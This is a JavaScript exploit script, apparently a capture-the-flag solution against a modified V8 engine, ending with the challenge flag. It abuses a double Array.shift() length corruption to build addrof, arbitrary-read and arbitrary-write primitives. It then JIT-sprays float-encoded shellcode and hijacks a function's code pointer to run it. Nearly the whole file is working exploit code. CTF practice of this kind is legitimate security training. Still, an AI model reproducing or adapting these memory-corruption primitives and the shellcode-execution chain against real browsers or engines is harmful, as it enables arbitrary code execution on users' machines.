var buf = new ArrayBuffer(8);
var u64_buf = new Uint32Array(buf);
var f64_buf = new Float64Array(buf);

/*
 * Converts a float to an int
 */
function ftoi(val) {
        f64_buf[0] = val;
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 0x20n);
}

/*
 * Converts an int to a float
 */
function itof(val) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 0x20n);
        return f64_buf[0];
}

/*
 * Converts float to hex string
 */
function fhex(val) {
    return "0x" + ftoi(val).toString(16)
}

/*
 * Converts int to hex string
 */
function ihex(val) {
    return "0x" + val.toString(16)
}

const shellcode = () => {
    return [
        1.9574502851816774e-246,
        1.9711828980704844e-246,
        1.9710273563755743e-246,
        1.9710306776801506e-246,
        1.9710426122240434e-246,
        1.9711824370196102e-246,
        1.989515391245563e-246,
        1.9711823508922016e-246,
        1.9710306767810517e-246,
        1.971182900732201e-246,
        1.971182290282495e-246,
        1.9844872657700175e-246,
        1.9711823042602023e-246,
        1.971090644412196e-246,
        7.85320185179034e-310
    ]
}

for (var i = 0; i < 0x1000000; i++) {
    shellcode();
}

let arr = Array(1).fill(1.1);
arr.shift();
arr.shift();
/* console.log(arr.length); */
let dbl_arr = [4.4];
let obj_arr = [{},{}];
/**/
/* console.log(ihex(addrof(temp))); */

let rw_offset = 0; 
function addrof(a) {
    obj_arr[0] = a;
    return ftoi(arr[15]) >> 32n;
}
function aar(a) {
    /* arr[4] = 0x1; */
    /* console.log(fhex(arr[5])); */
    /* console.log(fhex(dbl_arr[0])); */
    arr[5] = itof((ftoi(arr[5]) & 0xffffffffn) + (a << 32n));
    return ftoi(dbl_arr[0]);
}

function aaw(a, v) {
    /* console.log("write: ",fhex(arr[5])); */
    /* console.log("write: ",fhex(dbl_arr[0])); */

    arr[5] = itof((ftoi(arr[5]) & 0xffffffffn) + (a << 32n));
    dbl_arr[0] = itof(v);
}

/* console.log("index 11: ", fhex(arr[7])); */

let shellcode_addr = addrof(shellcode); // get address of shellcode 
let code_addr = aar(shellcode_addr + 0x10n) & 0xffffffffn;  // get the code address <-- this works
/* console.log("code addr: ", ihex(code_addr)); */
let real_inst = aar(code_addr)+0x59n; 
/* console.log("real addr: ", ihex(real_inst)); */
aaw(code_addr, real_inst); // code_addr + 0x10n is where the code should be
/* %SystemBreak(); */

shellcode();
/* <EOF> */
/**/
/* DH{Shift_to_V12_is_S0000000000000_Dangerous!} */
